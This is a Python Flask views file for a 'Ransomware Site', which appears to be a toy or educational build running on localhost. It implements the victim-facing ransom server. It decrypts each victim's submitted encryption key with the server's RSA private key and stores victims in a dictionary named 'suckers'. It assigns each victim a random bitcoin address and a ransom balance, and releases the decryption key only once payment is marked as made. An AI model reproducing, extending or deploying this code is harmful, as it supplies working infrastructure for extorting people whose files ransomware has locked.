from flask import render_template, redirect, request, url_for
from app import app
from .forms import DataForm
from app.utils import *
from app.rsa import *
import random,time,binascii

title = 'Ransomware Site'
suckers = {}
serv_key = RSA_key()
serv_url = 'http://localhost:5000'
serv_key.import_key('app/server_key.asc')

@app.route('/', methods=['GET', 'POST'])
@app.route('/index', methods=['GET', 'POST'])
def index():
    form = DataForm
    if request.method == 'POST':
        return redirect(url_for('index'))
    else:
        return render_template('index.html', form=form)


@app.route('/user_p', methods=['POST'])
def user_p():
    global serv_key
    global serv_url
    result = request.form
    bit = randstr(64)
    userid = result['enteruid']
    enckey = result['enterdata']
    totalpaid = 1000000
    dec = serv_key.decrypt(binascii.a2b_base64(enckey))
    if dec.split('|')[0]=='VALID':
        deckey = dec.split('|')[1]
    else:
        return "Key is invalid."
    suckers[userid] = {'enckey':enckey,
                       'totalpaid':totalpaid,
                       'paid':False,
                       'bitaddr':bit,
                       'deckey': deckey
    }
    print suckers[userid]['deckey']
    return render_template("user.html", uid=userid, btcaddr=bit, balance=totalpaid, myurl=serv_url)


@app.route('/user/<userid>')
def user(userid):
    user = suckers[userid]
    user['paid']= (user['totalpaid'] >= 1000000)
    bit = user['bitaddr']
    totalpaid = user['totalpaid']
    paid = user['paid']
    return render_template("user.html", uid=userid, btcaddr=bit, balance=totalpaid, paid=paid, myurl=serv_url)

@app.route('/key/<userid>')
def key(userid):
    user = suckers[userid]
    paid = user['paid']
    deckey = user['deckey']
    if paid:
        return render_template("key.html", deckey=deckey)
    else:
        return 'You have not paid your due.'
